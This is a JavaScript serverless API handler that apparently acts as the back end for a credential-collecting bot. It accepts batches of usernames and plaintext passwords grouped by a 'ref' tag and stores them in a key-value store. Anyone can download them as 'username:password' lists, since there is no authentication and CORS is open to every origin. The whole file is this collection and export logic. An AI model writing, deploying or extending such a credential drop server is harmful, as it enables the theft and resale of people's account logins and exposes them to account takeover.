import { kv } from '@vercel/kv';

// Keys: "refs" = set of all ref names, "ref:{name}" = creds array

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  // POST - receive creds from bot
  if (req.method === 'POST') {
    try {
      const { ref, creds, ok: batchOk, fail: batchFail, total } = req.body || {};
      const r = ref || 'unknown';
      const ts = new Date().toISOString();

      // Get existing creds for this ref
      let existing = await kv.get(`ref:${r}`) || { creds: [], batches: 0, started: ts };
      
      const existingNames = new Set(existing.creds.map(c => c.u));
      let added = 0;
      for (const c of (creds || [])) {
        const u = c.username || c.u;
        const p = c.password || c.p;
        const rid = c.ref || c.rid || r;
        if (u && !existingNames.has(u)) {
          existing.creds.push({ u, p, rid, t: ts });
          existingNames.add(u);
          added++;
        }
      }
      existing.batches = (existing.batches || 0) + 1;
      existing.lastUpdate = ts;

      // Save to KV
      await kv.set(`ref:${r}`, existing);
      await kv.sadd('refs', r);

      return res.json({ ok: true, added, total: existing.creds.length });
    } catch (e) {
      return res.status(500).json({ error: e.message });
    }
  }

  // DELETE - remove specific account or entire ref
  if (req.method === 'DELETE') {
    try {
      const { ref, username, deleteAll } = req.body || {};

      if (ref && deleteAll) {
        await kv.del(`ref:${ref}`);
        await kv.srem('refs', ref);
        return res.json({ ok: true, message: `Deleted all for ref=${ref}` });
      }

      if (ref && username) {
        let data = await kv.get(`ref:${ref}`);
        if (data) {
          const before = data.creds.length;
          data.creds = data.creds.filter(c => c.u !== username);
          await kv.set(`ref:${ref}`, data);
          return res.json({ ok: true, deleted: before - data.creds.length, remaining: data.creds.length });
        }
        return res.json({ ok: false, message: 'Ref not found' });
      }

      if (username && !ref) {
        const refs = await kv.smembers('refs') || [];
        let total = 0;
        for (const r of refs) {
          let data = await kv.get(`ref:${r}`);
          if (data) {
            const before = data.creds.length;
            data.creds = data.creds.filter(c => c.u !== username);
            if (before !== data.creds.length) {
              await kv.set(`ref:${r}`, data);
              total += before - data.creds.length;
            }
          }
        }
        return res.json({ ok: true, deleted: total });
      }

      return res.status(400).json({ error: 'Provide ref+deleteAll or ref+username or username' });
    } catch (e) {
      return res.status(500).json({ error: e.message });
    }
  }

  // GET - view creds
  if (req.method === 'GET') {
    try {
      const ref = req.query.ref;
      const fmt = req.query.format;

      if (ref) {
        const data = await kv.get(`ref:${ref}`);
        if (!data) return res.json({ ok: true, ref, total: 0, creds: [] });
        
        if (fmt === 'txt') {
          res.setHeader('Content-Type', 'text/plain');
          const lines = data.creds.map(c => `${c.u}:${c.p}`).join('\n');
          return res.send(`# Ref: ${ref} | Total: ${data.creds.length}\n${lines}`);
        }
        return res.json({ ok: true, ref, total: data.creds.length, batches: data.batches, lastUpdate: data.lastUpdate, creds: data.creds });
      }

      // Summary of all refs
      const refs = await kv.smembers('refs') || [];
      const summary = {};
      let totalAll = 0;
      for (const r of refs) {
        const data = await kv.get(`ref:${r}`);
        if (data) {
          summary[r] = { total: data.creds.length, batches: data.batches, lastUpdate: data.lastUpdate };
          totalAll += data.creds.length;
        }
      }
      return res.json({ ok: true, totalCreds: totalAll, sessions: summary });
    } catch (e) {
      return res.status(500).json({ error: e.message });
    }
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
